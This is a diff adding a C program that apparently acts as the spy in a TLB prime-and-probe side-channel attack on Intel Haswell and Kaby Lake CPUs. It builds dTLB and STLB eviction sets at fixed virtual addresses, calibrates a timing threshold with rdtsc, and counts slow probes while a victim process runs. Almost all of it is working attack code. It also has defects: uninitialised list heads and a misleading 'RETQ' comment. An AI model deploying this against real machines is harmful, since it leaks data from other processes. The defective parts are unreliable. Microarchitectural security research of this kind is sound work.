@@ -1,0 +1,282 @@
+#define _GNU_SOURCE
+#include<stdio.h>
+#include<stdint.h>
+#include<pthread.h>
+#include<sched.h>
+#include<unistd.h>
+#include<stdlib.h>
+#include<string.h>
+#include<assert.h>
+
+#include "spy.h"
+
+#define L1_SETS 64
+#define L1_ASSOC 8
+#define L1_DTLB_SETS 16
+#define L1_DTLB_ASSOC 4
+#define L2_STLB_SETS 128
+#define L2_STLB_ASSOC 8
+#define uint64_size 8
+#define PAGES 4096
+#define PAGE 4096
+#define VTARGET 0x300000000000ULL
+#define HASWELL 1
+//#define KABYLAKE 1
+
+uint64_t array[50000];
+
+
+struct node *allocate_buffer(unsigned long long p)
+{
+	assert(p >= 0);
+	volatile char *target = (void *) (VTARGET+p*PAGE);
+	volatile char *ret;
+	//printf("[DEBUG] allocating buffer at address %p\n", target);
+	ret = mmap((void *) target, PAGE, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS|MAP_FIXED, -1, 0);
+	if(ret == MAP_FAILED) {
+		perror("mmap");
+           exit(1);
+	}
+	if(ret != (volatile char *) target) { fprintf(stderr, "Wrong mapping\n"); exit(1); }
+    *ret;
+	memset((char *) ret, 0x00, PAGE); /* RETQ instruction */
+	return (struct node *)ret;
+}
+
+
+
+void evict_l1(){
+    int i, j;
+    for(i=0; i<L1_SETS; i++){
+	for(j=0; j<L1_ASSOC; j++)
+	    array[i + (j*uint64_size*L1_SETS)] = 0;
+    }
+    return;
+}
+
+struct node *create_evict_set1(int pages, int set_no){
+    assert(pages == 4);
+    int page_no, offset;
+    struct node *head, *request;
+    uint64_t mask;
+    while(pages != 0){
+        page_no = rand() % 6567536;
+        /*
+         * check if page is targetting an particular set in l1
+         */
+        if((page_no % L1_DTLB_SETS) == set_no){
+            //printf("[DEBUG1] allocating page no %d\n", page_no);
+            request = allocate_buffer(page_no);
+            request->addr = NULL;
+            offset = rand() % 63;
+            offset = offset << 6;
+            mask = (uint64_t)request;
+            mask += offset;
+            request = (struct node *)mask;
+            //printf("[DEBUG5] mask %lx, offset: %x request addr: %p\n", mask, offset, request);
+            if(head == NULL)
+                head = request;
+            else{
+                request->addr = head;
+                head = request;
+            }
+            pages--;
+        }
+    }
+    return head;
+}
+
+
+struct node *create_evict_set2(int pages, int set_no){
+    assert(pages > 0);
+    int page_no, offset, upper_bits, lower_bits, count, l2_set_no;
+    uint64_t mask;
+    struct node *head, *request;
+    count = 0;
+    while(pages != 0){
+        page_no = rand() % 65536;
+#ifdef BROADWELL
+        mask =  (VTARGET+pages*PAGE) >> 12;
+        lower_bits = mask & 0xFF;
+        upper_bits = mask & 0xFF00;
+        upper_bits = upper_bits >> 8;
+        l2_set_no = upper_bits ^ lower_bits;
+#endif
+#ifdef KABYLAKE
+        page_no = rand()%21626930;
+        mask =  (VTARGET+page_no*PAGE) >> 12;
+        lower_bits = mask & 0x7F;
+        upper_bits = mask & 0x3F80;
+        upper_bits = upper_bits >> 7;
+        l2_set_no = upper_bits ^ lower_bits;
+#endif
+#ifdef HASWELL
+        l2_set_no = (page_no % L2_STLB_SETS); 
+#endif
+        if((page_no % L1_DTLB_SETS) == set_no && l2_set_no == set_no ){
+            //printf("[DEBUG] allocating page no %d\n", page_no);
+            request = allocate_buffer(page_no);
+            request->addr = NULL;
+            offset = rand() % 63;
+            offset = offset << 6;
+            mask = (uint64_t)request;
+            mask += offset;
+            request = (struct node *)mask;
+            //printf("[DEBUG] adding address %p to list 2\n", request);
+            if(head == NULL){
+                count++;
+                head = request;
+            }
+            else{
+                request->addr = head;
+                head = request;
+                count++;
+            }
+            pages--;
+        }
+    }
+    printf("[DEBUG] ");
+    print_list(head);
+    printf("[DEBUG] Pages: %d, count: %d\n", pages, count);
+    return head;
+}
+
+
+void *pin_thread(void *arg){
+    int arg_value = *(int *)arg;
+    pthread_t curr = pthread_self();
+    //pid_t pid = getpid();
+    cpu_set_t cpuset;
+    CPU_ZERO(&cpuset);
+    CPU_SET(arg_value, &cpuset);
+    if(pthread_setaffinity_np(curr, sizeof(cpu_set_t), &cpuset)){
+	fprintf(stderr, "[ERROR] scheduling affinity for arg: %d (thread: %lu) failed\n", arg_value, curr);
+    }
+    CPU_ZERO(&cpuset);
+    if(pthread_getaffinity_np(curr, sizeof(cpu_set_t), &cpuset)){
+	fprintf(stderr, "[ERROR] retriving affinity for arg: %d (thread: %lu) failed\n", arg_value, curr);
+    }
+    if(CPU_ISSET(arg_value, &cpuset))
+	fprintf(stdout, "[DEBUG] cpu affinity successfully set for arg: %d (thread: %lu)\n", arg_value, curr);
+    else
+	fprintf(stdout, "[DEBUG] cpu affinity not correctly set for arg: %d (thread: %lu)\n", arg_value, curr);
+    if(arg_value == 1){
+	evict_l1();
+	//profile_time();
+    }
+    return NULL;
+}
+
+int calibrate(struct node *set1, struct node *set2, int target_set){
+    int access_time[100], max, min;
+    uint64_t probe;
+    probe = (uint64_t)set1;
+    evict_l1();
+    asm volatile("cpuid" ::: "rax","rbx","rcx");
+    for(int i=0; i<100; i++){
+        PROFILE_TIME_START
+        PROFILE_TIME_SET1
+        PROFILE_TIME_END
+    }
+    //print_array(access_time, 100, 2, 1);//Flag 2 for L2 hit
+    max = 0;
+    for(int i=1; i<100; i++){
+        if(max < access_time[i])
+            max = access_time[i];
+    }
+    
+    //printf("max_threashold %d\n", max);
+
+    probe = (uint64_t)set2;
+    evict_l1();
+    asm volatile("cpuid" ::: "rax","rbx","rcx");
+    for(int i=0; i<100; i++){
+        PROFILE_TIME_START
+        PROFILE_TIME_HASWELL_SET2
+        PROFILE_TIME_END
+    }
+    //print_array(access_time, 100, 2, 1);//Flag 2 for L2 hit
+    asm volatile("cpuid" ::: "rax","rbx","rcx");
+    min = 600000;
+    for(int i=0; i<100; i++){
+        if(min > access_time[i])
+            min = access_time[i];
+    }
+    //printf("min_threashold %d\n", max);
+    return (max+min)/2;
+}
+
+int main(){
+    int cpu_num, count, set_no, curr_access_time, access_time[100], threshold, max;
+    int *sync_var;
+    struct node *set1, *set2, *set3;
+    uint64_t probe;
+    volatile struct sharestruct *myshare = get_sharestruct();
+    cpu_num = 5;
+    set_no = 7;
+
+    //sync_var = (int *)get_shared_var();
+    pin_cpu(cpu_num);
+    set1 = create_evict_set1(L1_DTLB_ASSOC, set_no);
+    set2 = create_evict_set2(6, set_no);
+
+    /* 
+     * DEBUG
+    */
+    printf("[OUT] Set1: ");
+    print_list(set1);
+    printf("[OUT] Set2: ");
+    print_list(set2);
+    printf("[OUT] Set3: ");
+    //print_list(set3);
+    threshold = calibrate(set1, set2, set_no);
+    //threshold = 5;
+    printf("threshold = %d\n", threshold);
+    //if(*sync_var == 2){
+        printf("boundary\n");
+    if(myshare->target_started == 2){
+        // Starting prime and probe as victim is waiting for sync
+        //*sync_var = 1;
+        myshare->target_started = 1;
+        //prime(set1, 4);
+        probe = (uint64_t)set1;
+        asm volatile(
+                "lfence\n"
+                "rdtsc\n"
+                "mov %%eax, %%edi\n"
+                "mov (%1), %1\n"
+                "mov (%1), %1\n"
+                "mov (%1), %1\n"
+                "mov (%1), %1\n"
+                "lfence\n"
+                "rdtscp\n"
+                "sub %%edi, %%eax\n"
+                "mov %%eax, %0\n"
+                : "=r" (curr_access_time)
+                : "r" (probe)
+                : "rax", "rbx", "rcx", "rdx", "rdi");
+        count = 0;
+        while(myshare->target_started == 1){
+            asm volatile(
+                    "lfence\n"
+                    "rdtsc\n"
+                    "mov %%eax, %%edi\n"
+                    "mov (%1), %1\n"
+                    "mov (%1), %1\n"
+                    "mov (%1), %1\n"
+                    "mov (%1), %1\n"
+                    "lfence\n"
+                    "rdtscp\n"
+                    "sub %%edi, %%eax\n"
+                    "mov %%eax, %0\n"
+                    : "=r" (curr_access_time)
+                    : "r" (probe)
+                    : "rax", "rbx", "rcx", "rdx", "rdi");
+            if(curr_access_time > threshold)
+                count++;
+        }
+        printf("%d\n", count);
+            
+    }
+    return 0;
+}
